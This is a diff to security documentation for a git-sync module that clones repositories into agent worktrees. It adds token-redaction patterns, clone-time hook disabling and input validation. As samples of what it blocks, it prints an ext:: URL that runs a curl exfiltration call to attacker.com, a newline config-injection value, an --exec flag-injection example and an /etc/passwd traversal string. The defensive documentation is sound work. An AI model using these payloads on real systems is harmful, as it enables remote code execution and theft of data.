@@ -581,7 +581,11 @@ The following regex patterns are matched and replaced with `[REDACTED]`:
 | `ghp_[A-Za-z0-9_]+` | GitHub Personal Access Tokens (classic) | `ghp_xxxxxxxxxxxx` |
 | `github_pat_[A-Za-z0-9_]+` | GitHub Fine-Grained PATs | `github_pat_xxxxxxxxxxxx` |
 | `gho_[A-Za-z0-9_]+` | GitHub OAuth Tokens | `gho_xxxxxxxxxxxx` |
+| `ghs_[A-Za-z0-9_]+` | GitHub App Installation Tokens | `ghs_xxxxxxxxxxxx` |
+| `ghr_[A-Za-z0-9_]+` | GitHub Refresh Tokens | `ghr_xxxxxxxxxxxx` |
+| `glpat-[A-Za-z0-9_-]+` | GitLab Personal Access Tokens | `glpat-xxxxxxxxxxxx` |
 | `Bearer\s+[A-Za-z0-9._-]+` | Bearer tokens in headers | `Bearer eyJhbGci...` |
+| `AKIA[A-Z0-9]{16}` | AWS Access Key IDs | `AKIAIOSFODNN7EXAMPLE` |
 
 ### Implementation
 
@@ -611,11 +615,150 @@ All git operations in `git-sync.ts` wrap errors through `wrapGitError()` before 
 
 ## Git Hook Protection
 
-Cloned repositories can contain malicious `.git/hooks/` scripts that execute automatically on git operations (commit, checkout, merge, etc.). To prevent remote code execution (RCE) from untrusted repos:
+Cloned repositories can contain malicious `.git/hooks/` scripts that execute automatically on git operations (commit, checkout, merge, etc.). To prevent remote code execution (RCE) from untrusted repos, hooks are disabled **during** the clone operation itself:
 
 ```typescript
-// After clone, disable hooks by redirecting to /dev/null
+// SECURITY: Disable git hooks DURING clone to prevent RCE from malicious repos.
+// The -c option applies the config before any hooks can execute.
+await simpleGit(undefined, defaultOptions).clone(repoUrl, worktreePath, [
+  '-c',
+  'core.hooksPath=/dev/null',
+  '--depth',
+  '1',
+  '--single-branch',
+  '-b',
+  baseBranch,
+]);
+
+// Ensure hooks remain disabled (belt-and-suspenders)
 await git.addConfig('core.hooksPath', '/dev/null');
 ```
 
-This is applied immediately after `cloneAgentRepository()` completes the clone operation.
+**Critical:** The `-c core.hooksPath=/dev/null` option is passed to the clone command itself, ensuring that even `post-checkout` hooks from the cloned repository cannot execute. Previously, setting this config *after* clone was vulnerable because malicious hooks could run during the clone process.
+
+## Git Command Injection Prevention
+
+### Repository URL Validation
+
+Before cloning, repository URLs are validated to prevent command injection via git's `ext::` protocol handler:
+
+```typescript
+function validateRepoUrl(url: string): void {
+  // Reject dangerous protocols that can execute commands
+  if (url.startsWith('ext::')) {
+    throw new Error('Invalid repository URL: ext:: protocol is not allowed');
+  }
+  if (url.startsWith('file://')) {
+    throw new Error('Invalid repository URL: file:// protocol is not allowed');
+  }
+
+  // Allow: https://, http://, git://, ssh://, git@host:path, /local/path
+  const isAllowedProtocol = ALLOWED_URL_PROTOCOLS.some((p) => url.startsWith(p));
+  const isSshSyntax = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+:/.test(url);
+  const isLocalPath = url.startsWith('/') || /^[A-Za-z]:[\\/]/.test(url);
+
+  if (!isAllowedProtocol && !isSshSyntax && !isLocalPath) {
+    throw new Error('Invalid repository URL: must use https, git, ssh protocol, git@ syntax, or local path');
+  }
+}
+```
+
+The `ext::` protocol is particularly dangerous as it can execute arbitrary shell commands:
+```bash
+# Example malicious URL (BLOCKED):
+ext::sh -c 'curl attacker.com/exfil?$(whoami)'% >&2
+```
+
+### Flag Injection Protection
+
+The `commitAndPushAgentWork()` function validates the `files` array to prevent command-line flag injection:
+
+```typescript
+for (const file of files) {
+  if (file !== '-A' && file.startsWith('-')) {
+    throw new Error(`Invalid file path: "${file}" looks like a flag`);
+  }
+}
+```
+
+This prevents attackers from injecting git flags via crafted file paths (e.g., `--exec=malicious_command`). The `-A` flag is explicitly allowed as it's the default for staging all changes.
+
+### Git Config Injection Prevention
+
+Git user configuration values (`user.name`, `user.email`) are validated before being written to prevent config injection via newlines:
+
+```typescript
+const CONTROL_CHAR_PATTERN = /[\n\r\0]/;
+
+function validateGitConfigValue(value: string, fieldName: string): void {
+  if (CONTROL_CHAR_PATTERN.test(value)) {
+    throw new Error(
+      `Invalid ${fieldName}: cannot contain newlines or control characters`
+    );
+  }
+}
+```
+
+This prevents attacks where a malicious user.name like `"Attacker\n[core]\nhooksPath = /tmp/evil"` could inject additional git config entries.
+
+## fs-layout Path Validation
+
+The `fs-layout.ts` module validates path segments using `hasTraversalSegments()` from `db/path-validation.ts`:
+
+### Validated Parameters
+
+| Function | Parameter | Validation |
+|----------|-----------|------------|
+| `getProjectRoot()` | `falconHome` | Non-empty, absolute path |
+| `getProjectRoot()` | `projectSlug` | Non-empty, no traversal |
+| `getAgentWorktreePath()` | `agentName` | Non-empty, no traversal |
+| `getIssuePath()` | `issueId` | Non-empty, no traversal |
+
+### falconHome Validation
+
+```typescript
+function validateFalconHome(falconHome: string): void {
+  if (!falconHome || falconHome.trim() === '') {
+    throw new Error('Invalid falconHome: cannot be empty');
+  }
+  if (!path.isAbsolute(falconHome)) {
+    throw new Error('Invalid falconHome: must be an absolute path');
+  }
+}
+```
+
+### Path Segment Validation
+
+```typescript
+function validatePathSegment(value: string, paramName: string): void {
+  if (!value || value.trim() === '') {
+    throw new Error(`Invalid ${paramName}: cannot be empty`);
+  }
+  if (hasTraversalSegments(value)) {
+    throw new Error(`Invalid ${paramName}: path traversal detected`);
+  }
+}
+```
+
+This prevents path traversal attacks where malicious values like `../../../etc/passwd` could escape the intended directory structure.
+
+## Worktree Existence Checks
+
+All git-sync functions that operate on existing agent worktrees verify the worktree exists before proceeding:
+
+```typescript
+async function assertWorktreeExists(worktreePath: string): Promise<void> {
+  if (!(await pathExists(worktreePath))) {
+    throw new Error(`Agent worktree not found: ${worktreePath}`);
+  }
+}
+```
+
+This is called at the start of:
+- `checkoutIssueBranch()`
+- `syncIdleAgentToBase()`
+- `pullRebase()`
+- `getAgentStatus()`
+- `commitAndPushAgentWork()`
+
+This provides clear error messages when attempting to operate on non-existent worktrees, rather than cryptic git errors.
